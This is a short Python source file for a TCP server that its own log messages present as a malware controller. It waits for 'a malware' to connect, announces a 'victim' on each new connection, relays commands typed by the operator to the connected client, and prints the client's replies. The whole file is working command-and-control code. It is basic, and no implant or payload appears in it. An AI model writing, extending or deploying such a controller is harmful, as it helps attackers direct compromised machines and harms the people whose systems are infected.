#  server.py server

from socket import *
from time import ctime
import select 
import sys

class Server:
    def __init__(self):
        self.HOST = 'localhost'
        self.PORT = 12346
        self.MESSAGE_LENGTH_SIZE = 64
        self.ENCODING = 'utf-8'
        self.ADDR = (self.HOST, self.PORT)
        self.BUFSIZE = 1024

    def send_message(self, client, msg):
        message = msg.encode(self.ENCODING)
        msg_length = len(message)
        msg_length = str(msg_length).encode(self.ENCODING)
        msg_length += b' ' * (self.MESSAGE_LENGTH_SIZE - len(msg_length))
        client.send(msg_length)
        client.send(message)

    def main(self):
        tcpServer = socket(AF_INET, SOCK_STREAM)
        tcpServer.bind(self.ADDR)
        tcpServer.listen(5)
        gets = [tcpServer, sys.stdin]

        while True:
            print('{}\t[WAITING] waiting for a malware...'.format(ctime()))
            tcpClient, addr = tcpServer.accept()
            print('{}\t[VICTIM DETECTED] new connection from {}:{}'.format(ctime(), addr[0], addr[1]))
            gets.append(tcpClient)

            while True:
                try:
                    readyInput, readyOutput, readyException = select.select(gets, [], [])
                    for indata in readyInput:
                        if indata == tcpClient:
                            # data = tcpClient.recv(self.BUFSIZE)
                            message_length = int(tcpClient.recv(self.MESSAGE_LENGTH_SIZE).decode(self.ENCODING))
                            data = tcpClient.recv(message_length).decode(self.ENCODING)
                            if not data:
                                break
                            print('{}\t[MESSAGE RECEIVED] malware: {}'.format(ctime(), data))
                        else:
                            data = input()
                            if not data:
                                break
                            # tcpClient.send(bytes(data, 'utf-8'))
                            self.send_message(tcpClient, data)
                except ValueError:
                    print('{}\t[CONNECTION LOST]'.format(ctime()))
                    break
            tcpClient.close()
        tcpServer.close()


if __name__ == '__main__':
    server = Server()
    server.main()